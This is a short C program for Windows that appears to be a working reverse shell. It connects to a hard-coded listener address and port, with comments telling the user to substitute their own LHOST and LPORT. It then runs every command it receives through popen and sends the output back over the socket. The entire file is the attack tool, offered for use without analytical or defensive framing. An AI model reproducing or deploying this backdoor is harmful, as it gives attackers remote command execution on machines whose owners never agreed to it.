#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER "10.0.1.35"  // Change to your LHOST
#define PORT 4444            // Change to your LPORT

int main() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char buffer[1024];
    int bytes_received;

    // Initialize Winsock
    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set up server information
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(SERVER);

    // Connect to the server
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed: %d\n", WSAGetLastError());
        closesocket(s);
        WSACleanup();
        return 1;
    }

    // Successfully connected, start receiving commands
    printf("Connected to server %s:%d\n", SERVER, PORT);
    while (1) {
        // Receive command from the listener
        memset(buffer, 0, sizeof(buffer));
        bytes_received = recv(s, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
            break;
        }

        // Execute the command
        buffer[bytes_received] = '\0';
        printf("Executing: %s\n", buffer);
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            send(s, "Failed to execute command\n", 25, 0);
            continue;
        }

        // Send the command output back to the listener
        while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
            send(s, buffer, strlen(buffer), 0);
        }

        fclose(fp);
    }

    // Close socket and clean up
    closesocket(s);
    WSACleanup();
    return 0;
}
